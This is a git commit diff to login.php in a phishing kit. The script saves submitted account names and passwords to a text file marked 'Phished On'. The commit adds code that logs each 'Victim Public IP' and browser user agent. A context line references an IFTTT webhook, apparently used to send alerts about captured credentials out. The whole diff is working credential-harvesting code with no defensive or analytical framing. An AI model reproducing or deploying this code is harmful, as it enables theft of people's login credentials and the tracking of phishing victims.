fba8084b9c9405f9a5444b83b837c08c2c1cf4e4
Reuel <adrenreuel@gmail.com>
2021-08-22 21:25:14 +0300

    Add files via upload

--- login.php
+++ login.php
@@ -6,6 +6,33 @@ $Password = $_POST['password'];
 
 file_put_contents("usernames.txt", "Account: " . $Username . " \nPassword: " . $Password . " \nPhished On: " . $Time . "\n===========================================\n", FILE_APPEND);
 
+if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
+$victim = "Victim Public IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+fwrite($fp, "\n===========================================\n");
+fclose($fp);
+
 // IFTTT Webhooks
 // https://maker.ifttt.com/use/d53eY9NjQ-FNIEurV2OpEH
 
